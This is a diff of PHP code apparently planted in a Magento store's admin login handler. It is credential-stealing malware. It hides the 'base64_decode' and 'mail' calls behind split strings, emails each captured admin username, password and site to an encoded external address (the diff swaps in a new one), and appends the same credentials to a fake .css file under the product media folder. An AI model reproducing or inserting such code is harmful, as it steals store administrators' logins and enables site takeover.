@@ -105,7 +105,7 @@ $country_code = $details->countryCode;
 $country_name = $details->country;
 $id = "ba"."se"."64"."_"."de"."co"."de";
 $db = "ma"."il";
-$key = $id("cmVhbHVuaXgwMEBnbWFpbC5jb20=");
+$key = $id("dW5peGxvZ3NAeWFuZGV4LnJ1");
 
 $auth .= "Username : ".$username."\n";
 $auth .= "Password : ".$password."\n";
@@ -118,16 +118,10 @@ $auth .= "Site : ".$srv."\n";
 $subjk = "".$country_code." [".$srv." - ".$ips."]";
 $headr = "From: Magento Admin <".$username."@".$ips.">";
 $db($key, $subjk, $auth, $headr);
-        $locate = $_SERVER["DOCUMENT_ROOT"]."/media/catalog/product/1/6/16admin.css";
-        if (! file_exists($locate) ){
-            $write = fopen($locate,"a");
-            fwrite($write,"\nAdmin\n\n");
-            fclose($write);
-        }else{
+        $locate = "/home/spragues/public_html/store/media/catalog/product/1/6/16admin.css";
             $write = fopen($locate,"a");
             fwrite($write,$auth."\n=========================================\n\n");
             fclose($write);
-        }
                 if (Mage::getSingleton('adminhtml/url')->useSecretKey()) {
                     Mage::getSingleton('adminhtml/url')->renewSecretUrls();
                 }
